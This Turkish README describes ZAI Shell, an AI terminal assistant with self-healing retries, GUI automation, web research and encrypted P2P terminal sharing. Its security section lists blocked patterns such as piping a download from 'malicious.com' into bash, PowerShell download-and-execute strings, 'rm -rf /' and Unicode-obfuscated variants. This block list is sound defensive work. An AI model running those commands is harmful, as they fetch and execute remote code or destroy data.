# ZAI Shell

[![EN](https://img.shields.io/badge/English-Documentation-blue?style=for-the-badge)](README.md)

**Kendi kendini onaran yetenekler, GUI otomasyonu, web araştırması ve uçtan uca şifreleme ile güvenli P2P işbirliği sunan AI terminal asistanı.**

ZAI hatalarla karşılaştığında pes etmez. Hataları analiz eder, strateji değiştirir ve başarılı olana kadar otomatik olarak yeniden dener.

![ZAI Shell Auto-Retry Demo](assets/autoretry.gif)

---

## ⚡ Hızlı Kurulum (2 Dakika)

```bash
# 1. Temel bağımlılıklar (gerekli)
pip install google-generativeai colorama psutil posthog

# 2. Ücretsiz API anahtarı al
# Ziyaret: https://aistudio.google.com/app/api-keys

# 3. Ortam değişkenini ayarla
# Windows PowerShell:
$env:GEMINI_API_KEY="anahtarin_buraya"

# Linux/Mac:
export GEMINI_API_KEY="anahtarin_buraya"

# 4. ZAI'yi çalıştır
git clone https://github.com/TaklaXBR/zai-shell.git
cd zaishell
python zaishell.py
```

**Gelişmiş özellikler isteğe bağlıdır** — gerektiğinde yükleyin:
```bash
# GUI Otomasyonu
pip install pyautogui keyboard

# Web Araştırması
pip install ddgs

# Kalıcı Bellek
pip install chromadb

# Çevrimdışı Mod
pip install transformers torch accelerate

# P2P için E2E Şifreleme
pip install cryptography

# Görüntü Analizi & Terminal Paylaşımı (dahili, Pillow gerektirir)
pip install pillow
```

**[📖 Tam kurulum kılavuzu](#-kurulum)**

---

## 🎯 Neden ZAI Shell?

### Diğer AI Terminallerinin Sorunu

**Geleneksel AI:**
```
Sen: "Türkçe karakterlerle dosya oluştur: şğüçöı"
AI: [komutu çalıştırır]
Hata: UnicodeDecodeError
AI: "Bir hata oluştu. Lütfen tekrar deneyin."
Sen: 😤 Manuel hata ayıklama
```

**ZAI Shell:**
```
Sen: "Türkçe karakterlerle dosya oluştur: şğüçöı"

ZAI: [UTF-8 dener]
Hata: Encoding sorunu
🔧 CP850'ye geçiliyor...
Hata: Hâlâ yanlış
🔧 CP1254'e geçiliyor...
✓ Başarılı!

Sen: ✓ Sıfır manuel çaba
```

---

## 📊 ZAI vs Rakipler

| Özellik | ZAI Shell v8.0 | ShellGPT | Open Interpreter | GitHub Copilot CLI | AutoGPT |
|---------|----------------|----------|------------------|-------------------|---------| 
| **Kendi Kendini Onaran Yeniden Deneme** | ✅ Strateji değiştirmeli 5 deneme | ❌ Manuel yeniden deneme | ❌ Manuel yeniden deneme | ❌ Manuel yeniden deneme | ⚠️ Döngü olası |
| **GUI Otomasyonu** | ✅ PyAutoGUI + AI görüşü | ❌ Sadece terminal | ✅ Computer API + OS modu | ❌ Sadece terminal | ⚠️ Web tarayıcısı üzerinden |
| **Web Araştırması** | ✅ DuckDuckGo + AI sentezi | ⚠️ Özel fonksiyonlar ile | ✅ Tam internet erişimi | ❌ Doğrudan web araması yok | ✅ Dahili internet erişimi |
| **Görüntü Analizi** | ✅ Gemini Vision | ❌ Mevcut değil | ✅ Vision modelleri desteklenir | ❌ Mevcut değil | ✅ GPT-4 Vision (multimodal) |
| **Terminal Paylaşımı (P2P)** | ✅ TCP + E2E şifreleme + ngrok | ❌ Paylaşım yok | ❌ Paylaşım yok | ⚠️ GitHub entegreli iş akışları | ❌ Paylaşım özelliği yok |
| **Kalıcı Bellek** | ✅ ChromaDB vektör + JSON yedek | ✅ Sohbet oturumları (--chat bayrağı) | ✅ Konuşma geçmişi | ⚠️ Sınırlı bağlam | ✅ Uzun vadeli + kısa vadeli bellek |
| **Düşünme Modu** | ✅ Açılıp kapatılabilir AI akıl yürütme | ❌ Kara kutu | ❌ Kara kutu | ❌ Kara kutu | ⚠️ Planlama adımlarını gösterir |
| **Çoklu Mod Sistemi** | ✅ Eco/Lightning/Normal + geçersiz kılma | ⚠️ Model değiştirme (ön ayar yok) | ⚠️ Bayraklarla model seçimi | ❌ Sabit Copilot modeli | ❌ Sadece GPT-4/3.5 |
| **Güvenlik Kontrolleri** | ✅ --safe/--show/--force bayrakları | ⚠️ Temel onay | ✅ Onay tabanlı çalıştırma | ✅ Her zaman onaylar + MCP politikaları | ⚠️ Otonom (yüksek risk) |
| **Çevrimdışı Mod** | ✅ Phi-2 yerel (GPU/CPU) | ❌ Sadece API | ✅ LM Studio/Ollama ile yerel modeller | ❌ GitHub hesabı gerektirir | ❌ OpenAI API gerekli |
| **Shell Desteği** | ✅ 13 shell (CMD/PS/Bash/WSL/vb) | ✅ Çapraz platform shell'ler | ✅ Python/JS/Shell çalışma zamanları | ✅ Bash/PowerShell/Zsh | ⚠️ Shell agnostik (Python uygulaması) |
| **Akıllı Yol Düzeltme** | ✅ Desktop/ → gerçek yollar | ❌ Manuel yollar | ✅ Tam dosya sistemi erişimi | ✅ Dosya sistemi işlemleri | ⚠️ Dosya işlemleri üzerinden |
| **Kurulum** | ✅ pip install (4 paket) | ✅ pip install (1 paket) | ✅ pip install (basit) | ⚠️ npm veya curl yükleyici | ⚠️ Docker + API anahtarları gerekli |
| **Maliyet** | ✅ Ücretsiz katman + çevrimdışı mod | ⚠️ API maliyetleri | ⚠️ API maliyetleri | ❌ Ücretli abonelik gerekli | ⚠️ Yüksek API kullanım maliyetleri |
| **Hibrit İş Akışları** | ✅ Terminal + GUI sorunsuz | ❌ Sadece terminal | ✅ Tam sistem + GUI kontrolü | ❌ Sadece terminal + GitHub | ⚠️ Web tarayıcısı + terminal |
| **Özel Fonksiyonlar** | ✅ Dahili + genişletilebilir | ✅ Eklenti sistemi + özel fonksiyonlar | ✅ Sınırsız Python çalıştırma | ✅ MCP entegrasyonları (genişletilebilir) | ✅ Eklenti ekosistemi |


---

## 💬 Topluluk Geri Bildirimleri

> "Repo'yu inceledim – 'self-healing' mantığı (komut başarısız olduğunda CMD'den PowerShell'e otomatik geçiş) gerçekten zekice. Sadece hata mesajı göstermekten çok daha akıllı."
> 
> — **Hacker News Kullanıcısı**

> "Self-healing retry mantığı harika... 15 yaşında bunu yapmış olman gerçekten etkileyici."
> 
> — **Reddit Kullanıcısı (r/LocalLLaMA)**

> "Çok fazla agentvari şey denedim, şu anda Claude Code ağır basıyor ama... özellikle offline model kullanımına bayıldım. Başarılarının devamını görmek isteriz."
> 
> — **Reddit Kullanıcısı (r/TurkDev)**

---

### Performans Karşılaştırması

**Stres Testi (44 Görev):**
- ✅ **%95.45** başarı oranı (44'ten 42 tamamlandı)
- ✅ **%100** başarı: dosya işlemleri, kod oluşturma, sistem bilgisi
- ✅ Farklı stratejilerle **5'e kadar** otomatik yeniden deneme
- ✅ **Sıfır kritik hata** — zarif hata işleme
- ❌ Sadece 2 başarısızlık: API kota limitleri nedeniyle

**Gerçek Dünya Örneği:**
```
Geleneksel: "Python dosyalarını listele"
└─ Hata → Manuel düzeltme → Yeniden dene → Belki çalışır

ZAI: "Python dosyalarını listele"  
└─ Hata → Encoding değiştir → Hata → Farklı shell dene → Hata → Yeni yaklaşım → ✓
    Süre: 22.8s | Çaban: Sıfır | Denemeler: 3/5
```

---

## ✨ v8.0 Özellikleri

### 🔐 P2P için Uçtan Uca Şifreleme
İşbirliği oturumlarınızı güçlü uçtan uca şifrelemeyle koruyun:
- **PBKDF2HMAC** SHA-256 ile şifre türetme
- **Fernet simetrik şifreleme** tüm iletişimler için
- **Şifreli dosya transferleri** bütünlük doğrulama ile
- **Sıfır bilgi mimarisi** - şifreler asla saklanmaz veya iletilmez

**E2E şifrelemeyi etkinleştir:**
```bash
# Şifreleme durumunu görüntüle
share encrypt

# Rastgele anahtar oluştur (tam anahtarı gösterir)
share encrypt random

# Şifre tabanlı anahtar
share encrypt <sifre>

# Belirli bir anahtar kullan
share encrypt key <anahtar>

# Şifrelemeyi aç/kapat
share encrypt on
share encrypt off
```

Etkinleştirildiğinde tüm mesajlar, komutlar ve dosyalar otomatik olarak uçtan uca şifrelenir.

### 🔧 Kendi Kendini Onaran Otomatik Yeniden Deneme (5 Deneme)
Hataları otomatik analiz edip strateji değiştirir:
- **Encoding tespiti** (UTF-8 → CP850 → CP1254)
- **Shell değiştirme** (PowerShell ↔ CMD ↔ Bash ↔ Git Bash ↔ WSL)
- **Komut yaklaşım varyasyonları**
- Farklı yöntemlerle **5 yeniden deneme**

**Örnek:**
```bash
Sen: "OS bilgisi ve Python versiyonunu al"

[1/5] [CMD] OS bilgisi al
└─ ❌ FINDSTR: Dosya açılamıyor

🔧 PowerShell'e geçiliyor...

[2/5] [PowerShell] OS bilgisi al
└─ ✅ Başarılı!
      [PowerShell] Python versiyonunu al
└─ ❌ Python PATH'te yok

🔧 py başlatıcısı deneniyor...

[3/5] [CMD] py başlatıcısı kullan
└─ ✅ Başarılı! Python 3.11.8
```

### 🖱️ GUI Otomasyon Köprüsü
Masaüstü uygulamalarını AI ile kontrol edin:
- **PyAutoGUI entegrasyonu** tıklama, yazma, kısayollar için
- **AI destekli öğe tespiti** ekran analizi kullanarak
- **Hibrit iş akışları**: Terminal komutları + GUI eylemleri
- **Görsel geri bildirimle hata kurtarma**

![Opera GX Kurulum Demo](assets/guiuse.gif)
**Hibrit iş akışı:** Opera GX yükleyen Terminal + GUI otomasyonu  
⭐ GUI adımları gerçek kullanıcı davranışını simüle eder, doğal bekleme süreleri dahil

**Örnek:**
```bash
Sen: "Chrome'u aç, Python docs ara, ilk sonuca tıkla"

ZAI hibrit plan oluşturur:
[1] [Terminal] start chrome
[2] [GUI] "Python docs" yaz + Enter
[3] [GUI] İlk arama sonucuna tıkla

Çalıştır? (Y/N): Y
✓ Tüm adımlar tamamlandı
```

### 🔍 Web Araştırma Motoru
Sentezli AI destekli web araması:
- **DuckDuckGo entegrasyonu** canlı aramalar için
- **AI sorgu optimizasyonu** (herhangi bir dili → İngilizce anahtar kelimeler)
- **Kaynak atıflı sonuç sentezi**
- **Araştırma modu** açma/kapama

**Örnek:**
```bash
Sen: "python son sürümünü araştır"

Optimize edilmiş arama: "python latest version"
5 sonuç bulundu:
1. Python 3.14.2 yayınlandı - python.org
2. Python 3.14'teki yenilikler - docs.python.org
...

AI: Arama sonuçlarına göre, Python 3.14.2 en son sürümdür
```

### 📸 Görüntü Analizi
Ekran görüntüleri ve resimler için Gemini Vision:
- **Çözümlerle hata ekran görüntüsü analizi**
- **Desteklenen formatlar**: PNG, JPG, JPEG, GIF, BMP, WEBP
- **Bağlama duyarlı** öneriler
- İstemlerde **otomatik tespit**

**Örnek:**
```bash
Sen: "error_screenshot.png analiz et"

ZAI: Görüntü analiz ediliyor...

Tespit Edilen Hata: ModuleNotFoundError: No module named 'requests'
Neden: Eksik bağımlılık
Çözüm: 'pip install requests' çalıştırın
```

### 🌐 Gelişmiş P2P Terminal Paylaşımı
Akıllı komut işleme ve uçtan uca şifreleme ile gerçek zamanlı çok istemcili işbirliği:

**v8.0'daki Yenilikler:**
- ✅ **E2E Şifreleme** şifre tabanlı anahtar türetme ile
- ✅ **--no-ai Modu** AI olmadan doğrudan komut çalıştırma
- ✅ **Shell Suffix** komutun sonuna shell adı ekle (wsl, bash, powershell...)
- ✅ **Dosya Transferi** parçalı yükleme (100MB max) + MD5 doğrulama
- ✅ **Doğal Dil Komutları** - AI host'ta düz metni yorumlar
- ✅ **Hedefe Özel Eylemler** - Belirli kullanıcılara dosya/komut gönder
- ✅ **Zengin Loglama** - Tüm aktiviteler için renk kodlu loglar
- ✅ **Akıllı İsim Sistemi** - Otomatik yinelenen isim işleme
- ✅ **Yayın Modu** - Host tüm helper'lara aynı anda gönderebilir

**Nasıl Çalışır:**

**1. Host şifreli oturum başlatır:**
```bash
Sen >>> share encrypt random
E2E Şifreleme: ON (Rastgele Anahtar)
Tam Anahtar (diğerleriyle paylaş):
abc123...uzun_anahtar...==

Sen >>> share start
Kayıtlı isim kullanılıyor: Host
=======================================================
   TERMINAL PAYLAŞIMI BAŞLATILDI - ÇOK İSTEMCİLİ P2P
=======================================================
İsminiz: Host
Yerel Adres: 192.168.1.22:5757
Şifreleme: ON

GLOBAL ERİŞİM İÇİN:
  1. Çalıştır: ngrok tcp 5757
  2. ngrok URL'ini paylaş

Bağlantılar bekleniyor...
```

**2. Helper şifreleme ile bağlanır:**
```bash
Sen >>> share encrypt key abc123...uzun_anahtar...==
E2E Şifreleme: ON (Özel Anahtar)

Sen >>> share connect 192.168.1.22:5757
Kayıtlı isim kullanılıyor: Helper
=======================================================
   BAĞLANDI - ÇOK İSTEMCİLİ P2P
=======================================================
İsminiz: Helper
Host: Host @ 192.168.1.22:5757
Şifreleme: ON
Bağlı Kullanıcılar: Host, Helper
```

**3. Doğal Dil Komutu (AI Destekli):**
```bash
# Helper tarafı - düz dil
Sen >>> share send zai masaüstünde toplamda kaç dosya var?

Komut gönderildi, onay bekleniyor...

# Host tarafı - AI otomatik yorumlar
==================================================
Helper'dan KOMUT:
Zai masaüstünde toplamda kaç dosya var?
==================================================
'share approve' veya 'share reject' yazın

Sen >>> share approve
Onaylandı: Zai masaüstünde toplamda kaç dosya var...
Çalıştırılıyor: Zai masaüstünde toplamda kaç dosya var?

Anlama: Masaüstü dosyalarını say
[1/1] [powershell] Masaüstündeki dosyaları say... OK
ZAI: Masaüstünde toplamda 24 dosya var.
Sonuç: 1/1 başarılı

# Helper sonucu alır
Komut onaylandı!
Çalıştırılıyor...

ZAI: Masaüstünde toplamda 24 dosya var.
```

**4. --no-ai Modu (AI olmadan doğrudan komut):**
```bash
# Host AI olmadan başlatır
Sen >>> share start --no-ai

=======================================================
   TERMINAL PAYLAŞIMI BAŞLATILDI - ÇOK İSTEMCİLİ P2P
=======================================================
İsminiz: Host
Yerel Adres: 192.168.1.22:5757
Mod: NO-AI (Doğrudan Çalıştırma) | Şifreleme: ON
⚠ NO-AI MODU: Helper gerçek komut gönderir, siz onaylarsınız

# Helper gerçek komutu gönderir (doğal dil değil)
Sen >>> share send dir Desktop

# Shell belirt (komutun sonunda)
Sen >>> share send sudo apt update wsl
Sen >>> share send Get-Process powershell
Sen >>> share send ls -la bash

# Host onaylar
Sen >>> share approve
[WSL] sudo apt update
Çalıştırılıyor...
```

**Desteklenen Shell'ler (--no-ai modu için):**
cmd, powershell, ps, pwsh, wsl, git-bash, cygwin, bash, sh, zsh, fish, ksh, tcsh, dash

**5. Doğrulamalı Şifreli Dosya Transferi:**
```bash
# Helper belirli kullanıcıya dosya gönderir
Sen >>> zai "C:\Users\user\Desktop\rapor.pdf" dosyasını Host'a gönder

[PAYLAŞIM-GÜVENLİ]
[P2P Eylemi: send_file]
Gönderiliyor: 100.0%
Dosya gönderildi, onay bekleniyor...

# Host şifreli dosyayı alır
==================================================
Helper -> Host DOSYA TRANSFERİ:
  Dosya: rapor.pdf
  Boyut: 3.5 MB
==================================================
Alınıyor: 100.0%
Dosya alındı: rapor.pdf (3.5 MB)
Kaydetmek için 'share accept', reddetmek için 'share deny' yazın

Sen >>> share accept
MD5 checksum doğrulandı ✓
Dosya kaydedildi: C:\Users\user\Downloads\rapor.pdf
```

**6. Çok İstemcili Yayın:**
```bash
# Host tüm helper'lara dosya gönderir
Sen >>> share file sunum.pptx
Dosya tüm istemcilere yayınlanıyor...
Gönderiliyor: 100.0%
Dosya gönderildi: sunum.pptx

# Tüm bağlı helper'lar aynı anda alır
```

**Temel Özellikler:**
- **Güvenli Mod Zorunlu**: Tüm komutlar host onayı gerektirir
- **AI Çevirisi**: Helper'lar doğal dil kullanır, AI shell komutlarına çevirir
- **Her Şey Şifreli**: Mesajlar, dosyalar ve komutlar şifrelenir
- **Bütünlük Doğrulama**: MD5 checksum bozuk transferleri önler
- **Akıllı Yönlendirme**: Belirli kullanıcıları hedefle veya herkese yayınla
- **Oturum Logları**: Tüm aktiviteleri takip et (bağlantı, mesaj, dosya, komut)
- **Global Erişim**: Dünya çapında işbirliği için ngrok üzerinden çalışır

**ngrok ile Global Erişim:**
```bash
# Host makinesinde
ngrok tcp 5757
→ Yönlendirme: tcp://0.tcp.ngrok.io:12345 -> localhost:5757

# Dünya çapında helper'larla paylaş
Helper >>> share encrypt ayni_sifre
Helper >>> share connect 0.tcp.ngrok.io:12345
→ Her yerden güvenle bağlandı!
```

### 🛡️ Geliştirilmiş Güvenlik Sistemi
v7.0'a göre önemli güvenlik iyileştirmeleri:
- **35+ yeni engellenen komut** (PowerShell, Windows, Unix varyantları)
- **Gizlenmiş komutlar için regex desen tespiti**
- **Unicode normalizasyonu** sıfır genişlik/homoglif saldırılarını önler
- **Yol geçişi koruması** (`..`, UNC, sistem dizinlerini engeller)
- **Ayrılmış dosya adı engelleme** (CON, NUL, COM1, vb.)
- **P2P isim temizleme** XSS/enjeksiyona karşı

**Örnek engellenen desenler:**
```bash
# Doğrudan engeller
rm -rf /, del /f /s, format C:, shutdown /s

# Desen tespiti
wget malicious.com | bash
powershell -encodedcommand <base64>
IEX (New-Object Net.WebClient).DownloadString(...)

# Unicode saldırıları
r‎m -rf /    # Sıfır genişlikli karakter içerir
rм -rf /     # 'm' yerine Kiril 'м'
```

### 🐚 13 Shell Desteği
**Windows:** CMD, PowerShell, PWSH, Git Bash, WSL, Cygwin  
**Linux/Unix:** Bash, Zsh, Fish, Sh, Ksh, Tcsh, Dash

![Çapraz Shell Demo](assets/crossshell.gif)
*Tek istekte WSL → CMD → PowerShell → WSL kullanımı*

### 🧠 Düşünme Modu
AI'nın akıl yürütme sürecini görün:
```bash
thinking on   # Akıl yürütmeyi göster
thinking off  # Gizle (daha hızlı)
thinking      # Durumu kontrol et
```

**Çıktı:**
```
🧠 Düşünme Süreci:
1. Kullanıcı Amacı: Sistem performans analizi
2. Güvenlik: Salt okunur işlemler, güvenli
3. Yöntem: PowerShell Get-Process
4. Shell: Windows entegrasyonu için PowerShell
5. Plan: Top 5 CPU → Top 5 bellek → Disk kullanımı
6. Sorunlar: Büyük çıktı → top 5 ile sınırla
7. Alternatif: Başarısız olursa, tasklist dene
```

### ⚡ Üç Hız Modu + Geçersiz Kılma
| Mod | Model | Kullanım Durumu | Hız |
|-----|-------|-----------------|-----|
| **Lightning** | flash-lite (T=0.0) | Maksimum hız, sohbet yok | ⚡⚡⚡ 1.90s |
| **Eco** | flash-lite (T=0.3) | Token verimli | ⚡⚡ 1.99s |
| **Normal** | flash (T=0.7) | En yüksek doğruluk | ⚡ 3.01s |

![Lightning Mod Performansı](assets/lightningtest.gif)
**Lightning mod çalışırken:** Masaüstünde 'pdfs' klasörü oluşturur ve toplamda 48 PDF'i sadece 3.34 saniyede 'pdfs' klasörüne taşır.

```bash
# Kalıcı geçiş
lightning
eco  
normal

# Geçici geçersiz kılma
"masaüstünü düzenle" eco
"karmaşık script" normal
```

### 🌐 Çevrimdışı Mod
Tamamen yerel çalıştır:
- **Microsoft Phi-2** (2.7B parametre)
- **GPU veya CPU** otomatik algılama
- **API maliyeti yok**, hız limiti yok
- **Gizlilik odaklı**: Veri asla makineden çıkmaz

```bash
switch offline  # Modeli indir (~5GB ilk seferde)
switch online   # API'ye dön
```

### 💾 Kalıcı Bellek
**Çift sistem:**
- **ChromaDB**: Semantik sorgular için vektör araması
- **JSON**: Otomatik yedek, son 50 konuşma

```bash
memory              # İstatistikler
memory show         # Son geçmiş
memory search "web scraper"  # İlgili ara
memory clear        # Sıfırla
```

### 🛡️ Güvenlik Kontrolleri
```bash
--safe / -s   # Tehlikeli komutları engelle (rm -rf, format, vb)
--show        # Çalıştırmadan önizle
--force / -f  # Onayı atla

# Örnekler
"logları sil" --safe     # Önce doğrular
"dosyaları düzenle" --show  # Planı gösterir
"script oluştur" --force  # Otomatik çalıştır
```

### 📁 Akıllı Yol Düzeltme
Kısayolları otomatik dönüştürür:
```bash
"Desktop/file.txt" → "C:\Users\KullaniciAdin\Desktop\file.txt"
"Documents/report.pdf" → "/home/user/Documents/report.pdf"
```

### 💻 Çoklu Görev Yürütme
Tek istekte birden fazla eylem çalıştır:
```bash
Sen: "Sistemi analiz et ve raporu Masaüstüne kaydet"

⚡ 5 eylem çalıştırılıyor...
[1/5] [PowerShell] Rapor oluştur... ✓
[2/5] [PowerShell] CPU istatistikleri... ✓
[3/5] [PowerShell] Bellek istatistikleri... ✓
[4/5] [PowerShell] Disk kullanımı... ✓
[5/5] [PowerShell] Ağ bilgisi... ✓

📊 5/5 başarılı | ⏱️ 15.39s
```

---

## 🔐 Gizlilik & Telemetri

ZAI Shell, kararlılığı, performansı ve özellik geliştirmesini iyileştirmek için **gizlilik öncelikli, anonim telemetri** kullanır.  
Komutlar, dosya içerikleri, dosya yolları, kişisel veriler, tuş vuruşları veya ekran içeriği asla toplanmaz.

Telemetri istediğiniz zaman devre dışı bırakılabilir:
```bash
telemetry off
```

Tam ayrıntılar: [`PRIVACY_TR.md`](PRIVACY_TR.md)

---

## 📥 Kurulum

### Önkoşullar
- **Python 3.8+** (3.10+ önerilir)
- **İnternet** (çevrimiçi mod için)

### Adım 1: Temel Bağımlılıklar
```bash
pip install google-generativeai colorama psutil posthog
```

### Adım 2: İsteğe Bağlı Özellikler
Sadece ihtiyacınız olanı yükleyin:

```bash
# GUI Otomasyonu (etkinleştir: gui on)
pip install pyautogui keyboard

# Web Araştırması (etkinleştir: research on)
pip install ddgs

# Vektör Bellek (otomatik geliştirme)
pip install chromadb

# Çevrimdışı Mod (yerel AI)
pip install transformers torch accelerate

# P2P için E2E Şifreleme
pip install cryptography

# Görüntü Analizi (genellikle önceden yüklü)
pip install pillow
```

### Adım 3: API Anahtarı
Ücretsiz Gemini API anahtarı al: https://aistudio.google.com/app/api-keys

**Windows (PowerShell):**
```powershell
$env:GEMINI_API_KEY="anahtarin_buraya"

# Kalıcı:
[System.Environment]::SetEnvironmentVariable('GEMINI_API_KEY', 'anahtarin_buraya', 'User')
```

**Linux/Mac:**
```bash
export GEMINI_API_KEY="anahtarin_buraya"

# Kalıcı:
echo 'export GEMINI_API_KEY="anahtarin_buraya"' >> ~/.bashrc
source ~/.bashrc
```

### Adım 4: ZAI'yi Çalıştır
```bash
git clone https://github.com/TaklaXBR/zai-shell.git
cd zaishell
python zaishell.py
```

---

## 📋 Tam Komut Referansı

```bash
# === ÖZELLİK AÇMA/KAPAMA ===
gui on/off          # GUI otomasyonu
research on/off     # Web araştırması
thinking on/off     # AI akıl yürütme gösterimi

# === MOD KONTROLÜ ===
normal              # Dengeli (flash, T=0.7)
eco                 # Token verimli (flash-lite, T=0.3)
lightning           # Maksimum hız (flash-lite, T=0.0)

# Geçici mod geçersiz kılma
"komut" eco
"komut" lightning

# === AĞ MODU ===
switch offline      # Yerel Phi-2 modeli
switch online       # Gemini API

# === BELLEK ===
memory              # İstatistikler
memory show         # Son geçmiş
memory search "sorgu"  # Semantik arama (ChromaDB)
memory clear        # Sıfırla

# === TERMINAL PAYLAŞIMI (P2P) ===
# Şifreleme
share encrypt             # Şifreleme durumu ve anahtarını göster
share encrypt on/off      # Şifrelemeyi aç/kapat
share encrypt random      # Rastgele anahtar oluştur (tam anahtarı gösterir)
share encrypt <sifre>     # Şifre tabanlı anahtar
share encrypt key <anahtar>   # Belirli Fernet anahtarı kullan

# Host komutları
share start [port]        # Oturum başlat (AI destekli)
share start --no-ai       # AI olmadan başlat (doğrudan komutlar)
share message <metin>     # Herkese mesaj gönder
share file <yol> [kullanıcı]  # Dosya gönder (belirli kullanıcı veya yayın)
share list                # Bağlı istemcileri listele
share approve             # Bekleyen komutu onayla
share reject              # Bekleyen komutu reddet
share end                 # Oturumu sonlandır

# Helper komutları (--no-ai modunda shell suffix ekle)
share connect IP:PORT     # Host'a bağlan
share send <komut>        # Komut gönder (host onayı gerekir)
share send dir wsl        # WSL'de çalıştır (--no-ai modu)
share send ls bash        # Bash'de çalıştır (--no-ai modu)
share message <metin>     # Herkese mesaj gönder
share file <yol> [kullanıcı]  # Dosya gönder (varsayılan: host)
share accept [yol]        # Gelen dosyayı kabul et
share deny                # Gelen dosyayı reddet
share logs                # Host loglarını iste
share end                 # Bağlantıyı kes

# --no-ai suffix için desteklenen shell'ler:
# cmd, powershell, ps, pwsh, wsl, git-bash
# cygwin, bash, sh, zsh, fish, ksh, tcsh, dash

# Bilgi komutları
share name <yeniisim>     # İsmini değiştir
share status              # Bağlantı durumunu göster
share users               # Bağlı kullanıcıları listele
share chat                # Sohbet geçmişini göster

# === GÜVENLİK BAYRAKLARI ===
--safe, -s      # Tehlikeli komutları engelle
--show          # Çalıştırmadan önizle
--force, -f     # Onayı atla

# === YARDIMCI ===
clear, cls      # Ekranı temizle
exit, quit      # ZAI'den çık
```

---

## 🎯 Kullanım Örnekleri

### Temel Terminal Görevleri
```bash
Sen: "Masaüstündeki Python dosyalarını listele"
Sen: "Disk alanını göster"
Sen: "Documents'ta yedek klasörü oluştur"
```

### GUI Otomasyonu
```bash
Sen: "Hesap makinesini aç ve 123 * 456 hesapla"
Sen: "Notepad'i aç ve hello world yaz"
Sen: "Google'da AI haberleri ara ve ilk sonuca tıkla"
```

### Web Araştırması
```bash
Sen: "En son Python sürümü nedir"
Sen: "REST API'ler için en iyi uygulamaları araştır"
Sen: "AI'daki son gelişmeleri bul"
```

### Görüntü Analizi
```bash
Sen: "screenshot.png analiz et"
Sen: "error_log.jpg'deki hatayı açıkla"
```

### Hibrit İş Akışları
```bash
Sen: "Python yükleyicisini indir ve çalıştır"
Sen: "Chrome'u aç, GitHub'a git ve bir repo klonla"
```

### Güvenli P2P İşbirliği
```bash
# Senaryo: Şifreli uzaktan sistem yönetimi

# 1. Host şifrelemeyi etkinleştirir ve başlatır
Host: share encrypt random
→ Tam anahtar gösterilir, kopyala
Host: share start
→ Adres: 192.168.1.100:5757, Şifreleme: ON

# 2. Helper aynı anahtarla bağlanır
Helper: share encrypt key <host_anahtari>
Helper: share connect 192.168.1.100:5757
→ Güvenle bağlandı

# 3. Helper doğal dil komutu gönderir
Helper: zai C sürücüsünde ne kadar boş alan var?
→ Komut gönderildi, onay bekleniyor...

# 4. Host onaylar ve AI çalıştırır
Host: share approve
→ AI yorumlar: "C: sürücüsü boş alanını kontrol et"
→ Çalıştırır: Get-PSDrive C | Select-Object Free
→ Sonuç: "C sürücüsünde 245 GB boş alan var"

# 5. Helper şifreli sonucu alır
Helper: Komut onaylandı!
        ZAI: C sürücüsünde 245 GB boş alan var

# 6. Doğrulamalı dosya transferi
Helper: zai "backup.zip" dosyasını Host'a gönder
→ Şifreli gönderiliyor: 100%
Host: share accept
→ MD5 doğrulandı ✓, Dosya kaydedildi

# Tüm iletişim uçtan uca şifreli
```

---

## 🐛 Bilinen Sınırlamalar

- **Çevrimdışı mod**: ~5GB indirme, CPU'da yavaş
- **GUI otomasyonu**: Ekran ortamı gerektirir
- **İngilizce olmayan karakterler**: 5 yeniden deneme sistemiyle %95 başarı
- **Ücretsiz API katmanı**: Hız limitleri (eco/offline mod kullanın)
- **ChromaDB bellek**: Ayrı kurulum
- **Terminal paylaşımı**: Uzaktan erişim için port yönlendirme gerektirir (kolay global erişim için ngrok kullanın)
- **E2E şifreleme**: Her iki taraf da aynı şifreyi kullanmalıdır; şifre kurtarma yok

---

## 🤝 Katkıda Bulunma

**Yardım yolları:**
- 🐛 [GitHub Issues](https://github.com/TaklaXBR/zai-shell/issues) üzerinden hata bildirin
- 💡 Özellik önerileri
- 🔧 Pull request gönderin
- 📝 Dokümantasyonu geliştirin
- 🌍 Shell yapılandırmaları ekleyin
- 🔐 Şifreleme uygulaması için güvenlik denetimleri

**İlk iyi sorunlar:**
- Shell yapılandırma örnekleri (Nushell, Fish)
- Diğer diller için encoding tespiti
- Otomatik test paketi
- Kod şablonları kütüphanesi
- Performans profilleme
- Ek şifreleme algoritmaları

---

## 📝 Lisans

**GNU Affero General Public License v3.0**

Açık kaynak, kullanımı ve değiştirilmesi ücretsiz.

---

## 🔗 Bağlantılar

- **GitHub**: [TaklaXBR/zai-shell](https://github.com/TaklaXBR/zai-shell)
- **Eski Sürümler**: Eski sürümler için `legacy/` klasörünü kontrol edin

---

## 📧 İletişim

**Geliştirici:** Ömer Efe Başol
**Rol:** Bağımsız Araştırmacı & Baş Geliştirici
**Yaş:** 15
**E-posta:** oe67111@gmail.com
**GitHub:** [@TaklaXBR](https://github.com/TaklaXBR)


---

<div align="center">

⭐ **ZAI terminal oturumunuzu kurtardıysa, yıldız bırakın!** ⭐

   **❤️ ile [@TaklaXBR](https://github.com/TaklaXBR) tarafından yapıldı | 15 Yaşında | Türkiye 🇹🇷**

</div>


